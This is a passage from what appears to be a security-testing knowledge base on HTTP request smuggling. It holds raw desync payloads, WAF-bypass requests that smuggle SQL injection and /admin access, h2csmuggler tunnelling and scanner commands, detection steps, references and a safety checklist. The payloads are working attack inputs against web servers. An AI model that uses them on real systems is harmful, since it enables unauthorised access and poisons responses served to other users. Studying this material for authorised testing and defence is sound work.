Content-Length: 15

x=1
0


# Header folding
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding:
 chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Exotic whitespace (0x0b - VT)
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding:\x0bchunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### HTTP/2 Desync Payload Collection

```http
# Header injection via newline
:method GET
:path /
:authority {{Hostname}}
header: ignored

GET /admin HTTP/1.1
Host: {{Hostname}}

# Content-Length smuggling
:method POST
:path /
:authority {{Hostname}}
content-length: 5

0

X

# Transfer-Encoding injection
:method POST
:path /
:authority {{Hostname}}
transfer-encoding: chunked

0


GET /admin HTTP/1.1
Host: localhost



# Underscore smuggling
:method POST
:path /
:authority {{Hostname}}
transfer_encoding: chunked

0

X

# UTF-8 smuggling (S uppercases to S)
:method POST
:path /
:authority {{Hostname}}
transfer-encoding: chunſed

0

X
```

---

## WAF Bypasses

### WAF Bypass via Request Smuggling

**Technique**: Smuggle malicious requests past the WAF

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin?id=1 UNION SELECT * FROM users-- HTTP/1.1
Host: target.com
Content-Length: 5

x=
```

**Result**: The WAF sees the outer POST request (benign), but the back-end processes the smuggled GET with SQL injection.

### WAF Bypass via Parser Confusion

**Technique**: Exploit parsing differences between WAF and back-end

```http
# WAF sees: Content-Length: 5 (stops reading after 5 bytes)
# Back-end sees: Transfer-Encoding: chunked (reads entire body)
POST /api HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

5
malicious_payload_here
0

```

### WAF Bypass via H2C Tunneling

**Technique**: Bypass WAF rules by tunneling through H2C

```bash
# Establish H2C tunnel past WAF
./h2csmuggler.py -x https://waf-protected-site http://backend/admin

# Send requests that would be blocked by WAF
# The WAF only sees the HTTP/1.1 upgrade request
# All subsequent HTTP/2 traffic bypasses WAF inspection
```

### WAF Bypass via HTTP/2 Downgrade

**Technique**: HTTP/2 headers bypass HTTP/1.1 WAF rules

```http
# HTTP/2 request with header injection
:method POST
:path /api
:authority {{Hostname}}
content-type: application/json

{"malicious": "payload"}
```

**Result**: The WAF might not inspect HTTP/2 traffic, or the downgrade introduces parsing discrepancies.

### WAFFLED Research Findings

**Content-Type Bypasses**:
```http
# multipart/form-data boundary confusion
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\x00malicious

# application/xml namespace confusion
Content-Type: application/xml; charset=utf-8

# application/json encoding confusion
Content-Type: application/json; charset=utf-16
```

---

## Detection Techniques

### Manual Detection Steps

```
Step 1: Identify front-end and back-end technologies
  - Check Server headers
  - Check Via, X-Cache, CF-Ray headers
  - Use wafw00f, httpx tech-detect

Step 2: Test for CL.TE
  - Send POST with CL=6, TE=chunked, body: "0\r\n\r\nG"
  - Send follow-up request
  - Check for "Unrecognized method GPOST" or timeout

Step 3: Test for TE.CL
  - Send POST with CL=4, TE=chunked, body: "5c\r\nGPOST...\r\n0\r\n\r\n"
  - Send follow-up request
  - Check for "Unrecognized method GPOST" or timeout

Step 4: Test for TE.TE
  - Try various TE obfuscations
  - Look for differential responses

Step 5: Test for HTTP/2 desync
  - Send HTTP/2 requests with header injection
  - Check if downgraded request contains injected headers

Step 6: Test for H2C smuggling
  - Send Upgrade: h2c request
  - Check for 101 Switching Protocols
  - Attempt to tunnel HTTP/2 traffic
```

### Automated Detection

```bash
# Using Smuggler
python3 smuggler.py -u https://target.com/

# Using http2smugl
http2smugl detect https://target.com/

# Using h2csmuggler
./h2csmuggler.py -x https://target.com/ --test

# Using Nuclei
nuclei -u https://target.com -t nuclei-templates/http/misconfiguration/request-smuggling/
```

### Confirmation Techniques

```
1. Differential Responses
   - Send smuggled request to non-existent path (/404)
   - Send normal request
   - If second response is 404, desync confirmed

2. Time-Based Detection
   - Send smuggled request with invalid chunk size
   - Server hangs waiting for more data
   - Timeout indicates successful smuggling

3. Error-Based Detection
   - Look for "Bad Request", "Unrecognized method", "Not Implemented"
   - These indicate the back-end processed the smuggled prefix

4. Response Queue Poisoning
   - Send smuggled request
   - Send attacker-controlled request
   - If response contains victim data, poisoning confirmed
```

---

## References

### Primary Research Papers

1. **HTTP Desync Attacks: Request Smuggling Reborn** (2019)
   - Author: James Kettle (@albinowax)
   - URL: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

2. **Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling** (2022)
   - Author: James Kettle (@albinowax)
   - URL: https://portswigger.net/research/browser-powered-desync-attacks

3. **HTTP/1.1 Must Die: The Desync Endgame** (2025)
   - Author: James Kettle (@albinowax)
   - URL: https://portswigger.net/research/http1-must-die

4. **Web Cache Entanglement: Novel Pathways to Poisoning** (2020)
   - Author: James Kettle (@albinowax)
   - URL: https://portswigger.net/research/web-cache-entanglement

5. **Practical Web Cache Poisoning** (2018)
   - Author: James Kettle (@albinowax)
   - URL: https://portswigger.net/research/practical-web-cache-poisoning

6. **WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls** (2025)
   - Authors: Academic researchers
   - URL: https://arxiv.org/html/2503.10846v2

### PortSwigger Web Security Academy Labs

1. Basic CL.TE vulnerability: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
2. Basic TE.CL vulnerability: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
3. Obfuscating the TE header: https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
4. TE.TE behavior: https://portswigger.net/web-security/request-smuggling/lab-te-te-behavior
5. Bypass front-end controls CL.TE: https://portswigger.net/web-security/request-smuggling/lab-bypass-front-end-controls-cl-te
6. Response queue poisoning: https://portswigger.net/web-security/request-smuggling/lab-response-queue-poisoning
7. Advanced topics: https://portswigger.net/web-security/request-smuggling/advanced
8. Browser-powered desync: https://portswigger.net/web-security/request-smuggling/browser

### GitHub Tools

1. HTTP Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
2. Smuggler: https://github.com/defparam/smuggler
3. http2smugl: https://github.com/neex/http2smugl
4. h2csmuggler: https://github.com/BishopFox/h2csmuggler
5. PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
6. HTTP Request Smuggling Payload List: https://github.com/payloadbox/http-request-smuggling-payload-list

### Nuclei Templates

1. Nuclei smuggling templates: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/request-smuggling
2. Nuclei docs - HTTP smuggling: https://github.com/projectdiscovery/nuclei-docs/blob/master/docs/template-examples/http-smuggling.md

### Additional Resources

1. HackTricks - HTTP Request Smuggling: https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
2. MDN - Transfer-Encoding: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding
3. MDN - Content-Length: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length
4. RFC 7230 - HTTP/1.1 Message Syntax and Routing
5. RFC 7540 - HTTP/2
6. BishopFox H2C Smuggling Technical Post: https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c

### Bug Bounty Writeups

1. GitHub Fat GET ($10,000): https://portswigger.net/research/practical-web-cache-poisoning
2. Mozilla SHIELD ($1,000): https://portswigger.net/research/practical-web-cache-poisoning
3. Zendesk Login CSRF: https://portswigger.net/research/web-cache-entanglement
4. Cloudflare Redirect DoS: https://portswigger.net/research/web-cache-entanglement
5. Red Hat XSS: https://portswigger.net/research/practical-web-cache-poisoning

---

## Quick Reference Card

### Desync Variant Quick Identification

| Symptom | Likely Variant |
|---------|---------------|
| "Unrecognized method GPOST" | CL.TE or TE.CL |
| Timeout on second request | TE.CL (back-end waiting for data) |
| 404 on normal request after smuggled 404 | CL.TE confirmed |
| Differential response to TE obfuscation | TE.TE |
| HTTP/2 header injection works | HTTP/2 Desync |
| 101 Switching Protocols on h2c | H2C Smuggling |
| Browser fetch() triggers desync | Client-Side Desync |

### Chunk Size Quick Reference

| Smuggled Request | Chunk Size (hex) |
|-----------------|-----------------|
| `GPOST / HTTP/1.1\r\nContent-Type:...Content-Length: 15\r\n\r\nx=1\r\n` | `5c` |
| `POST /404 HTTP/1.1\r\nContent-Type:...Content-Length: 15\r\n\r\nx=1\r\n` | `5e` |
| `GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n` | `2d` |

### Critical Headers for Smuggling

```
Content-Length: <must be carefully calculated>
Transfer-Encoding: chunked
Host: <can be overridden in smuggled request>
X-Forwarded-Host: <for cache poisoning>
X-Forwarded-For: <for IP spoofing>
X-Original-URL: <for path override>
X-Rewrite-URL: <for path override>
```

### Safety Checklist

```
[] Always use cache-busters to avoid poisoning real users
[] Use "dontpoisoneveryone" parameters during testing
[] Test on staging environments when possible
[] Use collaborator/personal domains for callbacks
[] Document all findings before reporting
[] Verify impact with minimal test cases
[] Consider race conditions in timing attacks
[] Respect rate limits to avoid DoS
```

---

> **End of Document**
> 
> This knowledgebase was compiled from authoritative sources including PortSwigger Research, HackTricks, PayloadsAllTheThings, GitHub security tools, and real-world bug bounty findings. Always use this information responsibly and ethically.
